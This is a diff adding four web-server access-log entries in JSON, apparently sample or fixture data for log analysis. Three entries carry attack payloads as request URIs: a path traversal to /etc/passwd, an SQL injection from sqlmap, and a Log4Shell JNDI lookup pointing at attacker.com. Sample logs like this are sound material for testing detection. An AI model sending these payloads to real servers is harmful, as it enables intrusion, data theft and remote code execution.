@@ -1,0 +1,7 @@
+{"level":"info","ts":1699999999.123,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"203.0.113.10","proto":"HTTP/2.0","method":"GET","host":"example.com","uri":"/","headers":{"User-Agent":["Mozilla/5.0"]}},"duration":0.000123,"size":512,"status":200}
+
+{"level":"info","ts":1699999999.456,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"198.51.100.23","proto":"HTTP/1.1","method":"GET","host":"example.com","uri":"/../../../../etc/passwd","headers":{"User-Agent":["curl/7.68.0"]}},"duration":0.000456,"size":0,"status":404}
+
+{"level":"info","ts":1700000000.0,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"1.2.3.4","remote_port":"54321","proto":"HTTP/1.1","method":"GET","host":"example.com","uri":"/?id=1 UNION SELECT 1,2,3--","headers":{"User-Agent":["sqlmap/1.7"]}},"status":200,"size":0,"duration":0.001}
+
+{"level":"info","ts":1700000000.0,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"1.2.3.4","remote_port":"54321","proto":"HTTP/1.1","method":"GET","host":"example.com","uri":"/${jndi:ldap://attacker.com/x}","headers":{"User-Agent":["curl/7.68.0"]}},"status":400,"size":0,"duration":0.001}
